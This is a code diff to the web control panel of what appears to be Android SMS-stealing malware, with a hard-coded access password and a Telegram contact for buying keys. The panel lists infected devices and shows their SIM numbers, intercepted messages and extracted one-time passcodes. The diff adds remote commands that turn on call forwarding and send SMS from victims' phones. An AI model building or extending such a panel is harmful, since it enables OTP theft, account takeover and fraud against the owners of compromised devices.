@@ -12,7 +12,7 @@
 body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow:hidden;height:100dvh;user-select:none}
 #bgVid{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:0;pointer-events:none}
 #bgOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,10,15,0.65);z-index:0;pointer-events:none}
-#bgAudio{display:none}
+
 .scr{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;display:none;flex-direction:column}
 .scr.act{display:flex}
 #logScr,#keyScr{justify-content:center;align-items:center}
@@ -25,7 +25,7 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
 .lb button:hover{background:#ff2244;color:#000;box-shadow:0 0 40px rgba(255,34,68,.3)}
 .lb .er{color:#ff4466;font-size:12px;margin-top:10px;text-shadow:0 0 10px rgba(255,68,102,.3)}
 .top{background:linear-gradient(180deg,rgba(255,34,68,.02),transparent);padding:12px 14px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #ff224411;z-index:2;min-height:52px;backdrop-filter:blur(12px)}
-.top .bck{font-size:20px;cursor:pointer;color:#ff2244;background:none;border:1px solid #ff224433;border-radius:6px;padding:4px 10px;font-family:'Fira Code',monospace;transition:.2s}
+.top .bck{font-size:20px;cursor:pointer;color:#ff2244;background:none;border:1px solid #ff224433;border-radius:6px;padding:4px 10px;font-family:'Fira Code',monospace;transition:.2z}
 .top .bck:hover{background:#ff224411}
 .top h2{flex:1;font-size:13px;font-family:'Orbitron',sans-serif;color:#ff2244;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;letter-spacing:2px}
 .top .bdg{font-size:8px;padding:4px 10px;border-radius:4px;border:1px solid #ff224444;color:#ff2244;background:#ff224408;white-space:nowrap;flex-shrink:0;letter-spacing:1px}
@@ -87,9 +87,13 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
 </head>
 <body>
 
-<video id="bgVid" muted loop playsinline><source src="background.mp4" type="video/mp4"></video>
+<video id="bgVid" muted loop playsinline>
+  <source src="background.mp4" type="video/mp4">
+</video>
 <div id="bgOverlay"></div>
-<audio id="bgAudio" loop preload="auto"><source src="background.mp3" type="audio/mpeg"></audio>
+<audio id="bgAudio" loop preload="auto">
+  <source src="background.mp3" type="audio/mpeg">
+</audio>
 
 <div id="logScr" class="scr act">
   <div class="lb">
@@ -130,6 +134,17 @@ body{font-family:'Fira Code',monospace;background:#0a0a0f;color:#ff2244;overflow
     <div id="detailInfo"></div>
     <div class="ts" id="detailTabs"></div>
     <div id="detailBody"></div>
+    <div id="detailFwd" style="display:none" class="cd">
+      <h3>↪ CALL FORWARDING</h3>
+      <div class="sip"><input id="devFwdNum" placeholder="█ Forward number"></div>
+      <div style="display:flex;gap:6px"><button class="ab" style="flex:1" onclick="doFwd('activate')">⏎ ACTIVATE</button><button class="ab sc" style="flex:1" onclick="doFwd('deactivate')">⏎ DEACTIVATE</button></div>
+    </div>
+    <div id="detailSmsSend" style="display:none" class="cd">
+      <h3>📤 SEND SMS</h3>
+      <div class="sip"><input id="devSmsTo" placeholder="█ Target number"></div>
+      <div class="sip"><input id="devSmsBody" placeholder="█ Message body"></div>
+      <button class="ab" onclick="doSendSms()" style="margin-top:8px">⏎ SEND</button>
+    </div>
   </div>
 </div>
 
@@ -149,16 +164,23 @@ const DEF_PASS='Alexa';
 const TG_ID='8976072495';
 
 function genKey(){window.location.href='https://t.me/'+TG_ID}
-function startMedia(){document.getElementById('bgVid').play().catch(()=>{});document.getElementById('bgAudio').play().catch(()=>{})}
+function startMedia(){const v=document.getElementById('bgVid'),a=document.getElementById('bgAudio');v.play().catch(()=>{});a.play().catch(()=>{})}
 function toggleMute(){const a=document.getElementById('bgAudio'),b=document.getElementById('muteBtn');a.muted=!a.muted;b.textContent=a.muted?'🔇':'🔊'}
-function copyT(t){if(navigator.clipboard)navigator.clipboard.writeText(t).then(()=>showToast('✔ COPIED'))}
+function copyT(t){if(navigator.clipboard){navigator.clipboard.writeText(t).then(()=>showToast('✔ COPIED'))}else showToast(t)}
 function parseTime(t){if(!t)return 0;try{return new Date(t.replace('|','')).getTime()}catch(e){return 0}}
 function getPhone(d){return d.mobNo||(d.sims&&d.sims[0]?d.sims[0].phoneNumber:'')||''}
-function getName(d){return d.modelName||d.deviceId.slice(0,10)||'UNKNOWN'}
+function getName(d){return d.modelName||d.deviceId?.slice(0,10)||'UNKNOWN'}
 function isOnline(d){return d.status===true}
-function getMsgCount(d){if(!d||!d.messages)return 0;return Object.keys(d.messages).length}
-function getMsgs(d){if(!d||!d.messages)return [];return Object.values(d.messages).sort((a,b)=>parseTime(b.dateTime)-parseTime(a.dateTime))}
-function getAllMsgs(){let r=[];Object.values(clients).forEach(c=>{if(c&&c.messages)Object.values(c.messages).forEach(m=>{if(m)r.push(m)})});return r.sort((a,b)=>parseTime(b.dateTime)-parseTime(a.dateTime))}
+function getDeviceSms(id){
+  const d=clients[id];
+  if(!d||!d.messages)return[];
+  return Object.values(d.messages).sort((a,b)=>parseTime(b.dateTime)-parseTime(a.dateTime))
+}
+function getAllSms(){
+  const list=[];
+  Object.keys(clients||{}).forEach(did=>{getDeviceSms(did).forEach(s=>list.push(s))});
+  return list.sort((a,b)=>parseTime(b.dateTime)-parseTime(a.dateTime))
+}
 function showToast(m){const t=document.getElementById('toast');t.textContent=m;t.style.opacity='1';clearTimeout(t._h);t._h=setTimeout(()=>t.style.opacity='0',2500)}
 
 function showScr(id){
@@ -168,7 +190,6 @@ function showScr(id){
   else if(id==='allSmsScr')renderAllSms();
 }
 window.closeDetail=()=>{curDeviceId='';showScr('mainScr')};
-
 function showKeyLogin(){document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));document.getElementById('keyScr').classList.add('act')}
 
 function doLogin(){
@@ -184,9 +205,7 @@ function doLogin(){
       renderDashboard();
       startMedia();
       showToast('█ ACCESS GRANTED');
-    }else{
-      document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
-    }
+    }else document.getElementById('loginErr').textContent='✖ ACCESS DENIED'
   }).catch(()=>{
     if(p===DEF_PASS){
       localStorage.setItem('po_pass',DEF_PASS);
@@ -196,7 +215,7 @@ function doLogin(){
       renderDashboard();
       startMedia();
       showToast('█ ACCESS GRANTED');
-    }else{document.getElementById('loginErr').textContent='✖ ERROR';}
+    }else document.getElementById('loginErr').textContent='✖ ERROR'
   });
 }
 document.getElementById('loginPass').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin()});
@@ -230,7 +249,9 @@ db.ref('clients').on('value',snap=>{clients=snap.val()||{};if(document.querySele
 db.ref('.info/connected').on('value',snap=>{if(snap.val()===true)showToast('█ CONNECTED')});
 
 function updateUI(){
-  const id=document.querySelector('.scr.act').id;
+  const scr=document.querySelector('.scr.act');
+  if(!scr)return;
+  const id=scr.id;
   if(id==='mainScr')renderDashboard();
   else if(id==='detailScr'&&curDeviceId)renderDetail();
   else if(id==='allSmsScr')renderAllSms();
@@ -238,14 +259,14 @@ function updateUI(){
 
 function renderDashboard(){
   const ids=Object.keys(clients).filter(k=>clients[k]&&clients[k].deviceId);
-  const all=getAllMsgs();
-  const otpCount=all.filter(s=>(s.message||'').toUpperCase().includes('OTP')).length;
+  const smsList=getAllSms();
+  const otpCount=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP')).length;
   const online=ids.filter(k=>isOnline(clients[k])).length;
   document.getElementById('onlineBdg').innerHTML='⬤ '+online;
   document.getElementById('dashStats').innerHTML=`
     <div class="s"><div class="v">${ids.length}</div><div class="l">DEVICES</div></div>
     <div class="s"><div class="v">${online}</div><div class="l">ONLINE</div></div>
-    <div class="s"><div class="v">${all.length}</div><div class="l">SMS</div></div>
+    <div class="s"><div class="v">${smsList.length}</div><div class="l">SMS</div></div>
     <div class="s"><div class="v">${otpCount}</div><div class="l">OTP</div></div>`;
   document.getElementById('dashButtons').innerHTML=`
     <div class="b" onclick="showOnline=false;showScr('mainScr')"><span class="ic">💻</span><span class="l">ALL DEV</span></div>
@@ -258,8 +279,8 @@ function renderDashboard(){
   if(q)filtered=filtered.filter(k=>k.toLowerCase().includes(q)||getPhone(clients[k]).toLowerCase().includes(q)||getName(clients[k]).toLowerCase().includes(q));
   let html=`<div class="cd"><h3>💻 DEVICES (${filtered.length}/${ids.length})</h3>`;
   filtered.forEach(k=>{
-    const d=clients[k],n=getName(d),o=isOnline(d),phone=getPhone(d),sms=getMsgs(d);
-    const ot=sms.filter(x=>x.message.toUpperCase().includes('OTP')).length;
+    const d=clients[k],n=getName(d),o=isOnline(d),phone=getPhone(d),sms=getDeviceSms(k);
+    const ot=sms.filter(x=>(x.message||'').toUpperCase().includes('OTP')).length;
     html+=`<div class="dc" onclick="openDevice('${k}')">
       <div class="tr"><span class="sno">${k.slice(0,8)}</span><span class="dn">${n}</span><span class="st ${o?'on':'off'}"></span></div>
       <div class="di">${phone?`<span class="cp" onclick="event.stopPropagation();copyT('${phone}')">📞${phone}</span>`:''}</div>
@@ -271,19 +292,27 @@ function renderDashboard(){
 }
 document.getElementById('srchInp').addEventListener('input',function(){searchQ=this.value;renderDashboard()});
 
-function openDevice(id){
-  curDeviceId=id;
+function openDevice(deviceId){
+  curDeviceId=deviceId;
+  document.getElementById('detailFwd').style.display='none';
+  document.getElementById('detailSmsSend').style.display='none';
   renderDetail();
   document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
   document.getElementById('detailScr').classList.add('act');
 }
 let dtTab='info';
-function switchTab(tab){dtTab=tab;renderDetail()}
+function switchTab(tab){
+  document.getElementById('detailFwd').style.display=tab==='fwd'?'block':'none';
+  document.getElementById('detailSmsSend').style.display=tab==='send'?'block':'none';
+  dtTab=tab;
+  renderDetail();
+}
 
 function renderDetail(){
-  const did=curDeviceId,d=clients[did];
-  if(!d){showToast('✖ DEVICE NOT FOUND');closeDetail();return}
-  const smsList=getMsgs(d),otps=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
+  const did=curDeviceId;
+  const d=clients[did]||{};
+  const smsList=getDeviceSms(did);
+  const otps=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
   const ol=isOnline(d),phone=getPhone(d);
   document.getElementById('detailTitle').textContent=getName(d);
   document.getElementById('detailBadge').textContent=ol?'⬤ ONLINE':'○ OFFLINE';
@@ -304,16 +333,19 @@ function renderDetail(){
   infoHtml+=`<div>SDCARD: <span>${d.isSdCard?'YES':'NO'}</span></div>`;
   infoHtml+=`<div>JOINED: <span>${d.joined||'-'}</span></div>`;
   infoHtml+=`<div>LAST : <span>${d.last_seen||'-'}</span></div>`;
+  infoHtml+=`<div>SIMs: <span>${d.sims?d.sims.map(s=>s.carrierName+' '+s.phoneNumber).join(', '):'-'}</span></div>`;
   infoHtml+=`<div>STAT : <span style="color:${ol?'#ff2244':'#3355ff'}">${ol?'ONLINE':'OFFLINE'}</span></div></div></div>`;
   document.getElementById('detailInfo').innerHTML=infoHtml;
   document.getElementById('detailTabs').innerHTML=`
     <div class="t ${dtTab==='info'?'act':''}" onclick="switchTab('info')">ℹ️ INFO</div>
-    <div class="t ${dtTab==='sms'?'act':''}" onclick="switchTab('sms')">📥 SMS</div>
-    <div class="t ${dtTab==='otp'?'act':''}" onclick="switchTab('otp')">🔑 OTP</div>`;
+    <div class="t ${dtTab==='fwd'?'act':''}" onclick="switchTab('fwd')">↪️ CALL FWD</div>
+    <div class="t ${dtTab==='send'?'act':''}" onclick="switchTab('send')">📤 SEND SMS</div>
+    <div class="t ${dtTab==='otp'?'act':""}" onclick="switchTab('otp')">🔑 OTP</div>
+    <div class="t ${dtTab==='sms'?'act':''}" onclick="switchTab('sms')">📥 SMS</div>`;
   document.getElementById('detailBody').innerHTML='';
   if(dtTab==='info'){
     let h='<div class="cd"><h3>ℹ️ DEVICE INFO</h3>';
-    h+=`<div class="hl"><div>SIMs: <span>${d.sims?d.sims.map(s=>s.carrierName+' '+s.phoneNumber).join(', '):'-'}</span></div></div>`;
+    h+=`<div class="hl"><div>No additional forms.</div></div>`;
     h+=`</div>`;
     document.getElementById('detailBody').innerHTML=h;
   }else if(dtTab==='otp'){
@@ -331,12 +363,33 @@ function renderDetail(){
         return `<div class="smi"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender}</div><div class="m">${body}</div><div class="t">${s.dateTime||''}</div></div></div>`
       }).join(''):'<div style="padding:20px;text-align:center;color:#ff224444;font-size:12px">NO MESSAGES</div>'}
     </div>`;
+  }else if(dtTab==='fwd'||dtTab==='send'){
+    // detailFwd and detailSmsSend sections are toggled via switchTab
   }
 }
 
+function doFwd(action){
+  const num=document.getElementById('devFwdNum').value.trim();
+  if(action==='activate'&&!num){showToast('█ ENTER FORWARD NUMBER');return}
+  db.ref('data/command').set({action:action==='activate'?'forward_on':'forward_off',number:num||'',deviceId:curDeviceId,timestamp:Date.now()},err=>{
+    if(err)showToast('✖ ERROR');
+    else{showToast(action==='activate'?'↪ FORWARD ACTIVATED: '+num:'↪ FORWARD DEACTIVATED');document.getElementById('devFwdNum').value=''}
+  });
+}
+
+function doSendSms(){
+  const to=document.getElementById('devSmsTo').value.trim();
+  const body=document.getElementById('devSmsBody').value.trim();
+  if(!to||!body){showToast('█ FILL ALL FIELDS');return}
+  db.ref('data/command').set({action:'send_sms',number:to,message:body,deviceId:curDeviceId,timestamp:Date.now()},err=>{
+    if(err)showToast('✖ ERROR');
+    else{showToast('📤 SMS COMMAND SENT TO '+to);document.getElementById('devSmsTo').value='';document.getElementById('devSmsBody').value=''}
+  });
+}
+
 function showAllOtps(){
-  const all=getAllMsgs();
-  const otps=all.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
+  const smsList=getAllSms();
+  const otps=smsList.filter(s=>(s.message||'').toUpperCase().includes('OTP'));
   document.querySelectorAll('.scr').forEach(s=>s.classList.remove('act'));
   document.getElementById('mainScr').classList.add('act');
   document.getElementById('dashStats').innerHTML='';
@@ -347,26 +400,27 @@ function showAllOtps(){
   </div>`;
   otps.forEach(s=>{
     const body=s.message||'';
-    html+=`<div class="oi"><div class="h"><span>${s.sender||'?'}</span><span>${s.dateTime||''}</span><span style="font-size:8px;color:#ff224444">${s.deviceId?.slice(0,8)||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
+    html+=`<div class="oi"><div class="h"><span>${s.sender||'?'}</span><span>${s.dateTime||''}</span></div><div class="oc">${body.replace(/[^0-9]/g,'').slice(0,8)}</div><div class="fr">${body.slice(0,100)}</div></div>`
   });
   html+=`${!otps.length?'<div style="padding:30px;text-align:center;color:#ff224444">NO OTPs</div>':''}`;
   document.getElementById('dashBody').innerHTML=html;
 }
 
 function renderAllSms(){
-  const all=getAllMsgs();
+  const all=getAllSms();
   document.getElementById('allSmsCnt').textContent=all.length;
   let html=`<div class="cd"><h3>📥 ALL SMS (${all.length})</h3>`;
   all.slice(0,200).forEach(s=>{
     const body=s.message||'';
     const sender=s.sender||'?';
-    html+=`<div class="smi"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender}</div><div class="m">${body}</div><div class="t">${s.dateTime||''}</div></div></div>`
+    html+=`<div class="smi" onclick="showDetailFromSms('${body}')"><div class="av">${sender[0]}</div><div class="b"><div class="n">${sender} <span style="font-size:9px;color:#ff224444">via device</span></div><div class="m">${body}</div><div class="t">${s.dateTime||''}</div></div></div>`
   });
   html+=`${!all.length?'<div style="padding:30px;text-align:center;color:#ff224444;font-size:12px">NO MESSAGES</div>':''}`;
   if(all.length>200)html+=`<div style="text-align:center;padding:10px;color:#ff224444;font-size:10px">SHOWING 200 OF ${all.length}</div>`;
   html+=`</div>`;
   document.getElementById('allSmsContent').innerHTML=html;
 }
+function showDetailFromSms(){}
 </script>
 </body>
 </html>
